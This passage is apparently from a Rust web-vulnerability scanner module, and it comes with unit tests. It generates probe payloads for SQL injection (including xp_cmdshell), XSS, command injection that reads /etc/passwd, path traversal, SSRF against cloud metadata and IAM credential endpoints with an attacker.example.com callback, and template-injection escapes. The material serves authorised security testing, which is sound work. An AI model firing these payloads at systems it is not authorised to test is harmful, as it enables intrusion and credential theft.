                        EvidenceType::ContentReflection,
                        0.85,
                    )
                    .with_description("MSSQL version extraction"),
                    SuggestedTest::new(
                        "'; EXEC xp_cmdshell 'ping 127.0.0.1'--",
                        EvidenceType::TimingAnomaly,
                        0.90,
                    )
                    .with_description("MSSQL xp_cmdshell test (dangerous)"),
                ]
            }
            Some(DbType::Oracle) => {
                vec![
                    SuggestedTest::new(
                        "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)='a'--",
                        EvidenceType::TimingAnomaly,
                        0.95,
                    )
                    .with_description("Oracle time-based injection"),
                    SuggestedTest::new(
                        "' UNION SELECT banner FROM v$version--",
                        EvidenceType::ContentReflection,
                        0.85,
                    )
                    .with_description("Oracle version extraction"),
                ]
            }
            Some(DbType::SQLite) => {
                vec![
                    SuggestedTest::new(
                        "' AND randomblob(500000000)--",
                        EvidenceType::TimingAnomaly,
                        0.90,
                    )
                    .with_description("SQLite heavy computation test"),
                    SuggestedTest::new(
                        "' UNION SELECT sqlite_version()--",
                        EvidenceType::ContentReflection,
                        0.85,
                    )
                    .with_description("SQLite version extraction"),
                ]
            }
            Some(DbType::Unknown) => Self::generate_sqli_tests(&None),
        }
    }

    /// Generate XSS tests based on context
    fn generate_xss_tests(context: &Option<XssContext>) -> Vec<SuggestedTest> {
        match context {
            None => {
                vec![
                    SuggestedTest::new(
                        "<script>alert(1)</script>",
                        EvidenceType::ContentReflection,
                        0.9,
                    )
                    .with_description("Basic script tag injection"),
                    SuggestedTest::new(
                        "<img src=x onerror=alert(1)>",
                        EvidenceType::ContentReflection,
                        0.85,
                    )
                    .with_description("Event handler injection"),
                    SuggestedTest::new(
                        "'\"><script>alert(1)</script>",
                        EvidenceType::ContentReflection,
                        0.80,
                    )
                    .with_description("Context escape with script"),
                    SuggestedTest::new(
                        "javascript:alert(1)",
                        EvidenceType::ContentReflection,
                        0.75,
                    )
                    .with_description("JavaScript protocol handler"),
                    SuggestedTest::new(
                        "<svg onload=alert(1)>",
                        EvidenceType::ContentReflection,
                        0.85,
                    )
                    .with_description("SVG event handler injection"),
                    SuggestedTest::new("{{7*7}}", EvidenceType::ContentReflection, 0.70)
                        .with_description("Template expression test (Angular/Vue)"),
                ]
            }
            Some(XssContext::Html) => {
                vec![
                    SuggestedTest::new(
                        "<script>alert(1)</script>",
                        EvidenceType::ContentReflection,
                        0.95,
                    )
                    .with_description("Script tag in HTML context"),
                    SuggestedTest::new(
                        "<img src=x onerror=alert(1)>",
                        EvidenceType::ContentReflection,
                        0.90,
                    )
                    .with_description("IMG tag with onerror"),
                    SuggestedTest::new(
                        "<svg/onload=alert(1)>",
                        EvidenceType::ContentReflection,
                        0.90,
                    )
                    .with_description("SVG with onload"),
                    SuggestedTest::new(
                        "<body onload=alert(1)>",
                        EvidenceType::ContentReflection,
                        0.85,
                    )
                    .with_description("Body tag with onload"),
                ]
            }
            Some(XssContext::Attribute) => {
                vec![
                    SuggestedTest::new(
                        "\" onmouseover=\"alert(1)\"",
                        EvidenceType::ContentReflection,
                        0.95,
                    )
                    .with_description("Attribute escape with event"),
                    SuggestedTest::new(
                        "' onmouseover='alert(1)'",
                        EvidenceType::ContentReflection,
                        0.90,
                    )
                    .with_description("Single quote attribute escape"),
                    SuggestedTest::new(
                        "\"><script>alert(1)</script>",
                        EvidenceType::ContentReflection,
                        0.85,
                    )
                    .with_description("Attribute escape to HTML"),
                    SuggestedTest::new(
                        "\" autofocus onfocus=\"alert(1)\"",
                        EvidenceType::ContentReflection,
                        0.90,
                    )
                    .with_description("Autofocus event injection"),
                ]
            }
            Some(XssContext::JavaScript) => {
                vec![
                    SuggestedTest::new("';alert(1)//", EvidenceType::ContentReflection, 0.95)
                        .with_description("JS string escape single quote"),
                    SuggestedTest::new("\";alert(1)//", EvidenceType::ContentReflection, 0.90)
                        .with_description("JS string escape double quote"),
                    SuggestedTest::new(
                        "</script><script>alert(1)</script>",
                        EvidenceType::ContentReflection,
                        0.85,
                    )
                    .with_description("Script tag break out"),
                    SuggestedTest::new("\\';alert(1)//", EvidenceType::ContentReflection, 0.80)
                        .with_description("Escape sequence bypass"),
                ]
            }
            Some(XssContext::Url) => {
                vec![
                    SuggestedTest::new(
                        "javascript:alert(1)",
                        EvidenceType::ContentReflection,
                        0.95,
                    )
                    .with_description("JavaScript protocol in URL"),
                    SuggestedTest::new(
                        "data:text/html,<script>alert(1)</script>",
                        EvidenceType::ContentReflection,
                        0.90,
                    )
                    .with_description("Data URL with script"),
                    SuggestedTest::new("//evil.com", EvidenceType::ContentReflection, 0.75)
                        .with_description("Protocol-relative URL injection"),
                ]
            }
            Some(XssContext::Css) => {
                vec![
                    SuggestedTest::new(
                        "expression(alert(1))",
                        EvidenceType::ContentReflection,
                        0.85,
                    )
                    .with_description("CSS expression (legacy IE)"),
                    SuggestedTest::new(
                        "</style><script>alert(1)</script>",
                        EvidenceType::ContentReflection,
                        0.90,
                    )
                    .with_description("Style tag break out"),
                    SuggestedTest::new(
                        "url('javascript:alert(1)')",
                        EvidenceType::ContentReflection,
                        0.80,
                    )
                    .with_description("CSS url() with JavaScript"),
                ]
            }
        }
    }

    /// Generate command injection tests based on OS type
    fn generate_cmdi_tests(os_type: &Option<OsType>) -> Vec<SuggestedTest> {
        match os_type {
            None => {
                vec![
                    SuggestedTest::new("; id", EvidenceType::ContentReflection, 0.85)
                        .with_description("Command separator with id"),
                    SuggestedTest::new("| id", EvidenceType::ContentReflection, 0.85)
                        .with_description("Pipe with id command"),
                    SuggestedTest::new("$(id)", EvidenceType::ContentReflection, 0.80)
                        .with_description("Command substitution"),
                    SuggestedTest::new("`id`", EvidenceType::ContentReflection, 0.80)
                        .with_description("Backtick command substitution"),
                    SuggestedTest::new(
                        "& ping -c 5 127.0.0.1 &",
                        EvidenceType::TimingAnomaly,
                        0.90,
                    )
                    .with_description("Background ping for timing"),
                    SuggestedTest::new("|| ping -c 5 127.0.0.1", EvidenceType::TimingAnomaly, 0.85)
                        .with_description("OR operator with ping"),
                ]
            }
            Some(OsType::Linux) => {
                vec![
                    SuggestedTest::new("; sleep 5", EvidenceType::TimingAnomaly, 0.95)
                        .with_description("Linux sleep command"),
                    SuggestedTest::new("| cat /etc/passwd", EvidenceType::ContentReflection, 0.90)
                        .with_description("Linux passwd file read"),
                    SuggestedTest::new("$(sleep 5)", EvidenceType::TimingAnomaly, 0.90)
                        .with_description("Command substitution sleep"),
                    SuggestedTest::new("; ls -la /", EvidenceType::ContentReflection, 0.85)
                        .with_description("Directory listing"),
                    SuggestedTest::new("| whoami", EvidenceType::ContentReflection, 0.85)
                        .with_description("Whoami command"),
                ]
            }
            Some(OsType::Windows) => {
                vec![
                    SuggestedTest::new("& ping -n 5 127.0.0.1", EvidenceType::TimingAnomaly, 0.95)
                        .with_description("Windows ping timing"),
                    SuggestedTest::new(
                        "| type C:\\Windows\\win.ini",
                        EvidenceType::ContentReflection,
                        0.90,
                    )
                    .with_description("Windows file read"),
                    SuggestedTest::new("& timeout /t 5", EvidenceType::TimingAnomaly, 0.90)
                        .with_description("Windows timeout command"),
                    SuggestedTest::new("| dir C:\\", EvidenceType::ContentReflection, 0.85)
                        .with_description("Windows directory listing"),
                    SuggestedTest::new("& whoami", EvidenceType::ContentReflection, 0.85)
                        .with_description("Windows whoami command"),
                ]
            }
            Some(OsType::Unknown) => Self::generate_cmdi_tests(&None),
        }
    }

    /// Generate path traversal tests
    fn generate_path_traversal_tests(base_path: &Option<String>) -> Vec<SuggestedTest> {
        let _ = base_path; // For future use with known paths

        vec![
            SuggestedTest::new("../../../etc/passwd", EvidenceType::ContentReflection, 0.90)
                .with_description("Linux passwd traversal"),
            SuggestedTest::new(
                "..\\..\\..\\windows\\win.ini",
                EvidenceType::ContentReflection,
                0.85,
            )
            .with_description("Windows win.ini traversal"),
            SuggestedTest::new(
                "....//....//....//etc/passwd",
                EvidenceType::ContentReflection,
                0.80,
            )
            .with_description("Double-dot bypass traversal"),
            SuggestedTest::new(
                "..%2f..%2f..%2fetc/passwd",
                EvidenceType::ContentReflection,
                0.80,
            )
            .with_description("URL encoded traversal"),
            SuggestedTest::new("/etc/passwd", EvidenceType::ContentReflection, 0.75)
                .with_description("Absolute path (Linux)"),
            SuggestedTest::new(
                "C:\\Windows\\win.ini",
                EvidenceType::ContentReflection,
                0.70,
            )
            .with_description("Absolute path (Windows)"),
            SuggestedTest::new(
                "..%252f..%252f..%252fetc/passwd",
                EvidenceType::ContentReflection,
                0.75,
            )
            .with_description("Double URL encoded traversal"),
        ]
    }

    /// Generate SSRF tests
    fn generate_ssrf_tests(target_type: &Option<SsrfTarget>) -> Vec<SuggestedTest> {
        match target_type {
            None => {
                vec![
                    SuggestedTest::new("http://127.0.0.1", EvidenceType::BehaviorChange, 0.85)
                        .with_description("Localhost access test"),
                    SuggestedTest::new("http://localhost", EvidenceType::BehaviorChange, 0.85)
                        .with_description("Localhost hostname test"),
                    SuggestedTest::new(
                        "http://169.254.169.254/latest/meta-data/",
                        EvidenceType::ContentReflection,
                        0.95,
                    )
                    .with_description("AWS metadata endpoint"),
                    SuggestedTest::new("http://[::1]", EvidenceType::BehaviorChange, 0.80)
                        .with_description("IPv6 localhost"),
                    SuggestedTest::new("http://0.0.0.0", EvidenceType::BehaviorChange, 0.75)
                        .with_description("All interfaces address"),
                    SuggestedTest::new("file:///etc/passwd", EvidenceType::ContentReflection, 0.85)
                        .with_description("File protocol test"),
                ]
            }
            Some(SsrfTarget::Cloud) => {
                vec![
                    SuggestedTest::new(
                        "http://169.254.169.254/latest/meta-data/",
                        EvidenceType::ContentReflection,
                        0.95,
                    )
                    .with_description("AWS IMDS v1"),
                    SuggestedTest::new(
                        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                        EvidenceType::ContentReflection,
                        0.95,
                    )
                    .with_description("AWS IAM credentials"),
                    SuggestedTest::new(
                        "http://metadata.google.internal/computeMetadata/v1/",
                        EvidenceType::ContentReflection,
                        0.90,
                    )
                    .with_description("GCP metadata"),
                    SuggestedTest::new(
                        "http://169.254.169.254/metadata/instance",
                        EvidenceType::ContentReflection,
                        0.90,
                    )
                    .with_description("Azure metadata"),
                ]
            }
            Some(SsrfTarget::Internal) => {
                vec![
                    SuggestedTest::new("http://192.168.1.1", EvidenceType::BehaviorChange, 0.85)
                        .with_description("Common router IP"),
                    SuggestedTest::new("http://10.0.0.1", EvidenceType::BehaviorChange, 0.85)
                        .with_description("Private range scan"),
                    SuggestedTest::new("http://172.16.0.1", EvidenceType::BehaviorChange, 0.85)
                        .with_description("Private range scan"),
                    SuggestedTest::new("http://internal", EvidenceType::BehaviorChange, 0.80)
                        .with_description("Internal hostname"),
                ]
            }
            Some(SsrfTarget::Localhost) => {
                vec![
                    SuggestedTest::new("http://127.0.0.1:22", EvidenceType::BehaviorChange, 0.90)
                        .with_description("SSH port probe"),
                    SuggestedTest::new("http://127.0.0.1:3306", EvidenceType::BehaviorChange, 0.90)
                        .with_description("MySQL port probe"),
                    SuggestedTest::new("http://127.0.0.1:6379", EvidenceType::BehaviorChange, 0.90)
                        .with_description("Redis port probe"),
                    SuggestedTest::new(
                        "http://127.0.0.1:27017",
                        EvidenceType::BehaviorChange,
                        0.90,
                    )
                    .with_description("MongoDB port probe"),
                ]
            }
            Some(SsrfTarget::External) => {
                vec![SuggestedTest::new(
                    "http://attacker.example.com/callback",
                    EvidenceType::ExploitSuccess,
                    0.95,
                )
                .with_description("External callback test")]
            }
        }
    }

    /// Generate template injection tests
    fn generate_ssti_tests(engine: &Option<String>) -> Vec<SuggestedTest> {
        let _ = engine; // For future use with known template engines

        vec![
            SuggestedTest::new("{{7*7}}", EvidenceType::ContentReflection, 0.90)
                .with_description("Jinja2/Twig expression"),
            SuggestedTest::new("${7*7}", EvidenceType::ContentReflection, 0.90)
                .with_description("FreeMarker/Velocity expression"),
            SuggestedTest::new("<%= 7*7 %>", EvidenceType::ContentReflection, 0.85)
                .with_description("ERB expression"),
            SuggestedTest::new("#{7*7}", EvidenceType::ContentReflection, 0.85)
                .with_description("Ruby/Slim expression"),
            SuggestedTest::new(
                "{{constructor.constructor('return this')()}}",
                EvidenceType::ContentReflection,
                0.95,
            )
            .with_description("Angular sandbox escape"),
            SuggestedTest::new(
                "{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}",
                EvidenceType::ContentReflection,
                0.90,
            )
            .with_description("Angular prototype manipulation"),
        ]
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_hypothesis_creation() {
        let mut engine = HypothesisEngine::new();

        let response_hints = ResponseHints {
            has_sql_keywords: true,
            reflects_input: true,
            ..Default::default()
        };

        let hypotheses =
            engine.generate_hypotheses("id", "1", "https://example.com/api", &response_hints);

        assert!(!hypotheses.is_empty());
        assert!(hypotheses
            .iter()
            .any(|h| matches!(h.hypothesis_type, HypothesisType::SqlInjection { .. })));
    }

    #[test]
    fn test_bayesian_update() {
        let mut engine = HypothesisEngine::new();

        let response_hints = ResponseHints::default();
        let hypotheses =
            engine.generate_hypotheses("test", "value", "https://example.com/api", &response_hints);

        let hyp_id = hypotheses[0].id.clone();
        let initial_prob = engine
            .get_hypothesis(&hyp_id)
            .unwrap()
            .posterior_probability;

        // Add positive evidence
        let evidence = Evidence::new(
            EvidenceType::ErrorMessage,
            "SQL error detected".to_string(),
            5.0, // Strong positive evidence
        );

        engine.update_with_evidence(&hyp_id, evidence);
        let updated_prob = engine
            .get_hypothesis(&hyp_id)
            .unwrap()
            .posterior_probability;

        assert!(updated_prob > initial_prob);
    }

    #[test]
    fn test_negative_evidence() {
        let mut engine = HypothesisEngine::new();

        let response_hints = ResponseHints {
            reflects_input: true,
            ..Default::default()
        };
        let hypotheses = engine.generate_hypotheses(
            "search",
            "test",
            "https://example.com/api",
            &response_hints,
        );

        // Find XSS hypothesis
        let xss_hyp = hypotheses
            .iter()
            .find(|h| matches!(h.hypothesis_type, HypothesisType::XssReflected { .. }))
            .unwrap();

        let hyp_id = xss_hyp.id.clone();
        let initial_prob = engine
            .get_hypothesis(&hyp_id)
            .unwrap()
            .posterior_probability;

        // Add negative evidence (input was filtered)
        let evidence = Evidence::new(
            EvidenceType::InputFiltered,
            "Script tags removed from response".to_string(),
            0.1, // Low likelihood ratio = negative evidence
        );

        engine.update_with_evidence(&hyp_id, evidence);
        let updated_prob = engine
            .get_hypothesis(&hyp_id)
            .unwrap()
            .posterior_probability;

        assert!(updated_prob < initial_prob);
    }

    #[test]
    fn test_entropy_calculation() {
        let hypothesis = Hypothesis {
            id: "test".to_string(),
            hypothesis_type: HypothesisType::SqlInjection { db_type: None },
            target: "https://example.com".to_string(),
            prior_probability: 0.5,
            posterior_probability: 0.5,
            evidence: Vec::new(),
            suggested_tests: Vec::new(),
            status: HypothesisStatus::Active,
            parent_hypothesis: None,
            child_hypotheses: Vec::new(),
        };

        // Maximum entropy at p=0.5
        let entropy = hypothesis.entropy();
        assert!((entropy - 1.0).abs() < 0.01); // Should be ~1.0

        // Test with high probability
        let high_prob_hyp = Hypothesis {
            posterior_probability: 0.99,
            ..hypothesis.clone()
        };
        assert!(high_prob_hyp.entropy() < 0.1); // Low entropy when certain

        // Test with low probability
        let low_prob_hyp = Hypothesis {
            posterior_probability: 0.01,
            ..hypothesis.clone()
        };
        assert!(low_prob_hyp.entropy() < 0.1); // Low entropy when certain
    }

    #[test]
    fn test_hypothesis_refinement() {
        let mut engine = HypothesisEngine::new();

        let response_hints = ResponseHints::default();
        let hypotheses =
            engine.generate_hypotheses("id", "1", "https://example.com/api", &response_hints);

        // Find SQL injection hypothesis
        let sqli_hyp = hypotheses
            .iter()
            .find(|h| {
                matches!(
                    h.hypothesis_type,
                    HypothesisType::SqlInjection { db_type: None }
                )
            })
            .unwrap();

        let parent_id = sqli_hyp.id.clone();

        // Refine into specific database types
        let child_ids = engine.refine_hypothesis(&parent_id);

        assert!(!child_ids.is_empty());
        assert_eq!(child_ids.len(), 5); // MySQL, PostgreSQL, MSSQL, Oracle, SQLite

        // Check parent is marked as refined
        let parent = engine.get_hypothesis(&parent_id).unwrap();
        assert_eq!(parent.status, HypothesisStatus::Refined);
    }

    #[test]
    fn test_get_best_hypothesis() {
        let mut engine = HypothesisEngine::new();

        let response_hints = ResponseHints {
            has_sql_keywords: true,
            reflects_input: true,
            ..Default::default()
        };

        engine.generate_hypotheses("id", "1", "https://example.com/api", &response_hints);

        let best = engine.get_best_hypothesis();
        assert!(best.is_some());

        // The best hypothesis should be active
        let best = best.unwrap();
        assert!(
            best.status == HypothesisStatus::Active
                || best.status == HypothesisStatus::NeedsMoreData
        );
    }

    #[test]
    fn test_hypothesis_confirmation() {
        let mut engine = HypothesisEngine::new();

        let response_hints = ResponseHints::default();
        let hypotheses =
            engine.generate_hypotheses("test", "value", "https://example.com/api", &response_hints);

        let hyp_id = hypotheses[0].id.clone();

        // Add strong positive evidence multiple times
        for _ in 0..3 {
            let evidence = Evidence::new(
                EvidenceType::ExploitSuccess,
                "Exploit succeeded".to_string(),
                20.0, // Very strong evidence
            );
            engine.update_with_evidence(&hyp_id, evidence);
        }

        let hypothesis = engine.get_hypothesis(&hyp_id).unwrap();
        assert_eq!(hypothesis.status, HypothesisStatus::Confirmed);
    }

    #[test]
    fn test_hypothesis_rejection() {
        let mut engine = HypothesisEngine::new();

        let response_hints = ResponseHints::default();
        let hypotheses =
            engine.generate_hypotheses("test", "value", "https://example.com/api", &response_hints);

        let hyp_id = hypotheses[0].id.clone();

        // Add strong negative evidence multiple times
        for _ in 0..5 {
            let evidence = Evidence::new(
                EvidenceType::InputFiltered,
                "All payloads blocked".to_string(),
                0.05, // Very low likelihood ratio
            );
            engine.update_with_evidence(&hyp_id, evidence);
        }

        let hypothesis = engine.get_hypothesis(&hyp_id).unwrap();
        assert_eq!(hypothesis.status, HypothesisStatus::Rejected);
    }

    #[test]
    fn test_context_priors() {
        let mut engine = HypothesisEngine::new();

        // Set context indicating SQL-related endpoint
        let priors = ContextPriors {
            has_sql_indicators: true,
            is_api_endpoint: true,
            ..Default::default()
        };
        engine.update_context(priors);

        let response_hints = ResponseHints::default();
        let hypotheses = engine.generate_hypotheses(
            "query",
            "test",
            "https://example.com/api/search",
            &response_hints,
        );

        // Find SQL injection hypothesis - should have higher prior
        let sqli_hyp = hypotheses
            .iter()
            .find(|h| matches!(h.hypothesis_type, HypothesisType::SqlInjection { .. }))
            .unwrap();

        assert!(sqli_hyp.prior_probability > 0.20);
    }

    #[test]
    fn test_get_active_hypotheses() {
        let mut engine = HypothesisEngine::new();

        let response_hints = ResponseHints {
            reflects_input: true,
            ..Default::default()
        };

        engine.generate_hypotheses("test", "value", "https://example.com/api", &response_hints);

        let active = engine.get_active_hypotheses();
        assert!(!active.is_empty());

        // Verify sorted by posterior probability
        for i in 1..active.len() {
            assert!(active[i - 1].posterior_probability >= active[i].posterior_probability);
        }
    }

    #[test]
    fn test_suggested_tests() {
        let mut engine = HypothesisEngine::new();

        let response_hints = ResponseHints::default();
        let hypotheses =
            engine.generate_hypotheses("id", "1", "https://example.com/api", &response_hints);

        // Find SQL injection hypothesis
        let sqli_hyp = hypotheses
            .iter()
            .find(|h| matches!(h.hypothesis_type, HypothesisType::SqlInjection { .. }))
            .unwrap();

        let tests = engine.get_all_tests(&sqli_hyp.id);
        assert!(!tests.is_empty());

        // Verify tests are sorted by priority
        for i in 1..tests.len() {
            assert!(tests[i - 1].priority >= tests[i].priority);
        }
    }

    #[test]
    fn test_engine_stats() {
        let mut engine = HypothesisEngine::new();

        let response_hints = ResponseHints {
            reflects_input: true,
            ..Default::default()
        };

        engine.generate_hypotheses("id", "1", "https://example.com/api", &response_hints);

        let stats = engine.get_stats();
        assert!(stats.total > 0);
        assert!(stats.active > 0);
        assert_eq!(stats.confirmed, 0);
        assert_eq!(stats.rejected, 0);
    }

    #[test]
    fn test_clear_engine() {
        let mut engine = HypothesisEngine::new();

        let response_hints = ResponseHints::default();
        engine.generate_hypotheses("test", "value", "https://example.com/api", &response_hints);

        assert!(!engine.get_active_hypotheses().is_empty());

        engine.clear();

        assert!(engine.get_active_hypotheses().is_empty());
        assert_eq!(engine.get_stats().total, 0);
    }

    #[test]
    fn test_needs_more_data() {
        let hypothesis = Hypothesis {
            id: "test".to_string(),
            hypothesis_type: HypothesisType::SqlInjection { db_type: None },
            target: "https://example.com".to_string(),
            prior_probability: 0.5,
            posterior_probability: 0.5,
            evidence: Vec::new(),
            suggested_tests: Vec::new(),
            status: HypothesisStatus::Active,
            parent_hypothesis: None,
            child_hypotheses: Vec::new(),
        };

        assert!(hypothesis.needs_more_data()); // 0.5 is in uncertain range

        let certain_high = Hypothesis {
            posterior_probability: 0.95,
            ..hypothesis.clone()
        };
        assert!(!certain_high.needs_more_data());

        let certain_low = Hypothesis {
            posterior_probability: 0.05,
            ..hypothesis.clone()
        };
        assert!(!certain_low.needs_more_data());
    }

    #[test]
    fn test_evidence_with_payload() {
        let evidence = Evidence::new(
            EvidenceType::ErrorMessage,
            "SQL syntax error".to_string(),
            3.0,
        )
        .with_payload("' OR '1'='1");

        assert_eq!(evidence.test_payload.as_deref(), Some("' OR '1'='1"));
    }

    #[test]
    fn test_hypothesis_type_names() {
        assert_eq!(
            HypothesisType::SqlInjection { db_type: None }.name(),
            "SQL Injection"
        );
        assert_eq!(
            HypothesisType::XssReflected { context: None }.name(),
            "Reflected XSS"
        );
        assert_eq!(
            HypothesisType::CommandInjection { os_type: None }.name(),
            "Command Injection"
        );
        assert_eq!(
            HypothesisType::Ssrf { target_type: None }.name(),
            "Server-Side Request Forgery"
        );
    }
}
